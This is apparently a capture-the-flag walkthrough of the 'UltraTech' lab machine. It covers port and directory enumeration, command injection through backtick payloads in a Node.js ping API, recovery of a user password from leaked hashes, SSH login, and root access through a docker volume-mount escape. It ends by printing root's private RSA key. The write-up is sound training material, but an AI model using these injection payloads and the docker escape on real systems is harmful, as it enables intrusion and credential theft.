# IP
10.10.117.164 and  10.10.118.225 

## Enumeration

### Nmap
Found 4 ports running on the machine

```console
❯ nmap -sC -sV 10.10.117.164 -p- -vvv --min-rate=700 | tee nmap.log
Starting Nmap 7.92 ( https://nmap.org ) at 2022-11-06 12:37 IST
NSE: Loaded 155 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 12:37
Completed NSE at 12:37, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 12:37
Completed NSE at 12:37, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 12:37
Completed NSE at 12:37, 0.00s elapsed
Initiating Ping Scan at 12:37
Scanning 10.10.117.164 [2 ports]
Completed Ping Scan at 12:37, 0.15s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 12:37
Completed Parallel DNS resolution of 1 host. at 12:37, 0.00s elapsed
DNS resolution of 1 IPs took 0.00s. Mode: Async [#: 2, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating Connect Scan at 12:37
Scanning 10.10.117.164 [65535 ports]
Discovered open port 22/tcp on 10.10.117.164
Discovered open port 21/tcp on 10.10.117.164
Connect Scan Timing: About 31.93% done; ETC: 12:39 (0:01:06 remaining)
Connect Scan Timing: About 63.46% done; ETC: 12:39 (0:00:35 remaining)
Discovered open port 8081/tcp on 10.10.117.164
Discovered open port 31331/tcp on 10.10.117.164
Completed Connect Scan at 12:39, 95.79s elapsed (65535 total ports)
Initiating Service scan at 12:39
Scanning 4 services on 10.10.117.164
Completed Service scan at 12:39, 11.47s elapsed (4 services on 1 host)
NSE: Script scanning 10.10.117.164.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 12:39
Completed NSE at 12:39, 4.98s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 12:39
Completed NSE at 12:39, 1.10s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 12:39
Completed NSE at 12:39, 0.00s elapsed
Nmap scan report for 10.10.117.164
Host is up, received conn-refused (0.15s latency).
Scanned at 2022-11-06 12:37:26 IST for 113s
Not shown: 65531 closed tcp ports (conn-refused)
PORT      STATE SERVICE REASON  VERSION
21/tcp    open  ftp     syn-ack vsftpd 3.0.3
22/tcp    open  ssh     syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 dc:66:89:85:e7:05:c2:a5:da:7f:01:20:3a:13:fc:27 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDiFl7iswZsMnnI2RuX0ezMMVjUXFY1lJmZr3+H701ZA6nJUb2ymZyXusE/wuqL4BZ+x5gF2DLLRH7fdJkdebuuaMpQtQfEdsOMT+JakQgCDls38FH1jcrpGI3MY55eHcSilT/EsErmuvYv1s3Yvqds6xoxyvGgdptdqiaj4KFBNSDVneCSF/K7IQdbavM3Q7SgKchHJUHt6XO3gICmZmq8tSAdd2b2Ik/rYzpIiyMtfP3iWsyVgjR/q8oR08C2lFpPN8uSyIHkeH1py0aGl+V1E7j2yvVMIb4m3jGtLWH89iePTXmfLkin2feT6qAm7acdktZRJTjaJ8lEMFTHEijJ
|   256 c3:67:dd:26:fa:0c:56:92:f3:5b:a0:b3:8d:6d:20:ab (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBLy2NkFfAZMY462Bf2wSIGzla3CDXwLNlGEpaCs1Uj55Psxk5Go/Y6Cw52NEljhi9fiXOOkIxpBEC8bOvEcNeNY=
|   256 11:9b:5a:d6:ff:2f:e4:49:d2:b5:17:36:0e:2f:1d:2f (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIEipoohPz5HURhNfvE+WYz4Hc26k5ObMPnAQNoUDsge3
8081/tcp  open  http    syn-ack Node.js Express framework
|_http-title: Site doesn't have a title (text/html; charset=utf-8).
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-cors: HEAD GET POST PUT DELETE PATCH
31331/tcp open  http    syn-ack Apache httpd 2.4.29 ((Ubuntu))
|_http-title: UltraTech - The best of technology (AI, FinTech, Big Data)
|_http-favicon: Unknown favicon MD5: 15C1B7515662078EF4B5C724E2927A96
| http-methods: 
|_  Supported Methods: HEAD GET POST OPTIONS
|_http-server-header: Apache/2.4.29 (Ubuntu)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 12:39
Completed NSE at 12:39, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 12:39
Completed NSE at 12:39, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 12:39
Completed NSE at 12:39, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
```

## Gobuster(8081)
- This is an api so there should be some endpoint.

```console
❯ gobuster dir --url http://10.10.117.164:8081/ -w /usr/share/dirb/wordlists/common.txt | tee gobuster_api.log
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.117.164:8081/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/dirb/wordlists/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2022/11/06 12:42:57 Starting gobuster in directory enumeration mode
===============================================================
/auth                 (Status: 200) [Size: 39]
/ping                 (Status: 500) [Size: 1094]

===============================================================
2022/11/06 12:44:06 Finished
===============================================================
```

- When we go to `/auth` it asks for parameter but we don't know it, so tried searching for a login form on 31331.

## Gobuster(31331)

- Found a `robots.txt` file.

```console
❯ gobuster dir --url http://10.10.117.164:31331/ -w /usr/share/dirb/wordlists/common.txt | tee gobuster_web.log
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.117.164:31331/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/dirb/wordlists/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2022/11/06 12:44:47 Starting gobuster in directory enumeration mode
===============================================================
/.hta                 (Status: 403) [Size: 295]
/.htaccess            (Status: 403) [Size: 300]
/.htpasswd            (Status: 403) [Size: 300]
/css                  (Status: 301) [Size: 321] [--> http://10.10.117.164:31331/css/]
/favicon.ico          (Status: 200) [Size: 15086]
/images               (Status: 301) [Size: 324] [--> http://10.10.117.164:31331/images/]
/index.html           (Status: 200) [Size: 6092]
/javascript           (Status: 301) [Size: 328] [--> http://10.10.117.164:31331/javascript/]
/js                   (Status: 301) [Size: 320] [--> http://10.10.117.164:31331/js/]
/robots.txt           (Status: 200) [Size: 53]
/server-status        (Status: 403) [Size: 304]

===============================================================
2022/11/06 12:45:56 Finished
===============================================================

```

- In `robots.txt` file, there was a `/utech_sitemap.txt`.

```console
❯ curl http://10.10.117.164:31331/robots.txt
Allow: *
User-Agent: *
Sitemap: /utech_sitemap.txt
```

- In `/utech_sitemap.txt` file found a `/partners.html`

```console
❯ curl http://10.10.117.164:31331/utech_sitemap.txt
/
/index.html
/what.html
/partners.html
```

- This was a login page. 

## Web(:31331/partners.html)
- Tried logging in with some payloads but found nothing.

## API(:8081/ping)
- We see that when we do a get request to the /ping route, it sends an error of some mission parameter.

```console
❯ curl http://10.10.117.164:8081/ping
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<title>Error</title>
</head>
<body>
<pre>TypeError: Cannot read property &#39;replace&#39; of undefined<br> &nbsp; &nbsp;at app.get (/home/www/api/index.js:45:29)<br> &nbsp; &nbsp;at Layer.handle [as handle_request] (/home/www/api/node_modules/express/lib/router/layer.js:95:5)<br> &nbsp; &nbsp;at next (/home/www/api/node_modules/express/lib/router/route.js:137:13)<br> &nbsp; &nbsp;at Route.dispatch (/home/www/api/node_modules/express/lib/router/route.js:112:3)<br> &nbsp; &nbsp;at Layer.handle [as handle_request] (/home/www/api/node_modules/express/lib/router/layer.js:95:5)<br> &nbsp; &nbsp;at /home/www/api/node_modules/express/lib/router/index.js:281:22<br> &nbsp; &nbsp;at Function.process_params (/home/www/api/node_modules/express/lib/router/index.js:335:12)<br> &nbsp; &nbsp;at next (/home/www/api/node_modules/express/lib/router/index.js:275:10)<br> &nbsp; &nbsp;at cors (/home/www/api/node_modules/cors/lib/index.js:188:7)<br> &nbsp; &nbsp;at /home/www/api/node_modules/cors/lib/index.js:224:17</pre>
</body>
</html>
```

- Tried adding a parameter because it is a ping, and was successful.

```console
❯ curl http://10.10.117.164:8081/ping\?ip
Invalid ip parameter specified
```
- Tried loading localhost.

```console
❯ curl http://10.10.117.164:8081/ping\?ip\=127.0.0.1
PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.015 ms

--- 127.0.0.1 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 0.015/0.015/0.015/0.000 ms
```

- There should be some RCE, so loaded another different payloads.

```console
❯ curl 'http://10.10.117.164:8081/ping?ip=""'
ping: : Name or service not known
❯ curl "http://10.10.117.164:8081/ping?ip=''"
ping: : Name or service not known
❯ curl "http://10.10.117.164:8081/ping?ip=``"
Invalid ip parameter specified%                                                             ❯ curl 'http://10.10.117.164:8081/ping?ip=``'
Usage: ping [-aAbBdDfhLnOqrRUvV64] [-c count] [-i interval] [-I interface]
            [-m mark] [-M pmtudisc_option] [-l preload] [-p pattern] [-Q tos]
            [-s packetsize] [-S sndbuf] [-t ttl] [-T timestamp_option]
            [-w deadline] [-W timeout] [hop1 ...] destination
Usage: ping -6 [-aAbBdDfhLnOqrRUvV] [-c count] [-i interval] [-I interface]
             [-l preload] [-m mark] [-M pmtudisc_option]
             [-N nodeinfo_option] [-p pattern] [-Q tclass] [-s packetsize]
             [-S sndbuf] [-t ttl] [-T timestamp_option] [-w deadline]
             [-W timeout] destination
```

- Found one, can add command in ~~` `~~  
- Found a file `utech.db.sqlite`

```console
❯ curl 'http://10.10.117.164:8081/ping?ip=`ls`'
ping: utech.db.sqlite: Name or service not known
```

- Tried reading and found user hashes 

```console
ping: ) ␂␏�␏�␏�(␂␄␕M␈r00tf357a0c52799563c7c7b76c1e7543a32)␁␄␗M␈admin0d0ea5111e3c1def594c1684e3b9be84: Parameter string not correctly encoded 
```
- User root has hash: `f357a0c52799563c7c7b76c1e7543a32` : password: `n100906`  

## Exploitation 

### SSH
- Now we have credentials for `root` logged in to ssh.

```console
❯ ssh r00t@10.10.118.225
The authenticity of host '10.10.118.225 (10.10.118.225)' can't be established.
ED25519 key fingerprint is SHA256:g5I2Aq/2um35QmYfRxNGnjl3zf9FNXKPpEHxMLlWXMU.
This key is not known by any other names
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.118.225' (ED25519) to the list of known hosts.
r00t@10.10.118.225's password:
Welcome to Ubuntu 18.04.2 LTS (GNU/Linux 4.15.0-46-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

 System information disabled due to load higher than 1.0

 * Ubuntu's Kubernetes 1.14 distributions can bypass Docker and use containerd
   directly, see https://bit.ly/ubuntu-containerd or try it now with

     snap install microk8s --channel=1.14/beta --classic

1 package can be updated.
0 updates are security updates.



The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

r00t@ultratech-prod:~$ id
uid=1001(r00t) gid=1001(r00t) groups=1001(r00t),116(docker)

```

## Privilege Escalation

- We found docker running, checked a shell on [gtfobins](https://gtfobins.github.io/gtfobins/docker/#shell)

```console
r00t@ultratech-prod:~$ docker run -v /:/mnt --rm -it alpine chroot /mnt sh
Unable to find image 'alpine:latest' locally
docker: Error response from daemon: Get https://registry-1.docker.io/v2/: net/http: request canceled while waiting for connection (Client.Timeout exceeded while awaiting headers).
See 'docker run --help'.
```
- Didn't find alpine image so searched for one.

```console
r00t@ultratech-prod:~$ docker image ls
REPOSITORY          TAG                 IMAGE ID            CREATED             SIZE
bash                latest              495d6437fc1e        3 years ago         15.8MB
```
- Found it is called bash 

```console
r00t@ultratech-prod:~$ docker run -v /:/mnt --rm -it bash chroot /mnt bash
groups: cannot find name for group ID 11
To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.

root@b23b21cfd28c:/# ls
bin   etc         initrd.img.old  lost+found  opt   run   srv       tmp  vmlinuz
boot  home        lib             media       proc  sbin  swap.img  usr  vmlinuz.old
dev   initrd.img  lib64           mnt         root  snap  sys       var
root@b23b21cfd28c:/# whoami
root
root@b23b21cfd28c:/# cd /root
root@b23b21cfd28c:~# ls -a
.   .bash_history  .cache    .gnupg    .python_history  private.txt
..  .bashrc        .emacs.d  .profile  .ssh
root@b23b21cfd28c:~# cd .ssh
root@b23b21cfd28c:~/.ssh# ls
authorized_keys  id_rsa  id_rsa.pub
root@b23b21cfd28c:~/.ssh# cat id_rsa
-----BEGIN RSA PRIVATE KEY-----
MIIEogIBAAKCAQEAuDSna2F3pO8vMOPJ4l2PwpLFqMpy1SWYaaREhio64iM65HSm
sIOfoEC+vvs9SRxy8yNBQ2bx2kLYqoZpDJOuTC4Y7VIb+3xeLjhmvtNQGofffkQA
jSMMlh1MG14fOInXKTRQF8hPBWKB38BPdlNgm7dR5PUGFWni15ucYgCGq1Utc5PP
NZVxika+pr/U0Ux4620MzJW899lDG6orIoJo739fmMyrQUjKRnp8xXBv/YezoF8D
hQaP7omtbyo0dczKGkeAVCe6ARh8woiVd2zz5SHDoeZLe1ln4KSbIL3EiMQMzOpc
jNn7oD+rqmh/ygoXL3yFRAowi+LFdkkS0gqgmwIDAQABAoIBACbTwm5Z7xQu7m2J
tiYmvoSu10cK1UWkVQn/fAojoKHF90XsaK5QMDdhLlOnNXXRr1Ecn0cLzfLJoE3h
YwcpodWg6dQsOIW740Yu0Ulr1TiiZzOANfWJ679Akag7IK2UMGwZAMDikfV6nBGD
wbwZOwXXkEWIeC3PUedMf5wQrFI0mG+mRwWFd06xl6FioC9gIpV4RaZT92nbGfoM
BWr8KszHw0t7Cp3CT2OBzL2XoMg/NWFU0iBEBg8n8fk67Y59m49xED7VgupK5Ad1
5neOFdep8rydYbFpVLw8sv96GN5tb/i5KQPC1uO64YuC5ZOyKE30jX4gjAC8rafg
o1macDECgYEA4fTHFz1uRohrRkZiTGzEp9VUPNonMyKYHi2FaSTU1Vmp6A0vbBWW
tnuyiubefzK5DyDEf2YdhEE7PJbMBjnCWQJCtOaSCz/RZ7ET9pAMvo4MvTFs3I97
eDM3HWDdrmrK1hTaOTmvbV8DM9sNqgJVsH24ztLBWRRU4gOsP4a76s0CgYEA0LK/
/kh/lkReyAurcu7F00fIn1hdTvqa8/wUYq5efHoZg8pba2j7Z8g9GVqKtMnFA0w6
t1KmELIf55zwFh3i5MmneUJo6gYSXx2AqvWsFtddLljAVKpbLBl6szq4wVejoDye
lEdFfTHlYaN2ieZADsbgAKs27/q/ZgNqZVI+CQcCgYAO3sYPcHqGZ8nviQhFEU9r
4C04B/9WbStnqQVDoynilJEK9XsueMk/Xyqj24e/BT6KkVR9MeI1ZvmYBjCNJFX2
96AeOaJY3S1RzqSKsHY2QDD0boFEjqjIg05YP5y3Ms4AgsTNyU8TOpKCYiMnEhpD
kDKOYe5Zh24Cpc07LQnG7QKBgCZ1WjYUzBY34TOCGwUiBSiLKOhcU02TluxxPpx0
v4q2wW7s4m3nubSFTOUYL0ljiT+zU3qm611WRdTbsc6RkVdR5d/NoiHGHqqSeDyI
6z6GT3CUAFVZ01VMGLVgk91lNgz4PszaWW7ZvAiDI/wDhzhx46Ob6ZLNpWm6JWgo
gLAPAoGAdCXCHyTfKI/80YMmdp/k11Wj4TQuZ6zgFtUorstRddYAGt8peW3xFqLn
MrOulVZcSUXnezTs3f8TCsH1Yk/2ue8+GmtlZe/3pHRBW0YJIAaHWg5k2I3hsdAz
bPB7E9hlrI0AconivYDzfpxfX+vovlP/DdNVub/EO7JSO+RAmqo=
-----END RSA PRIVATE KEY-----

```
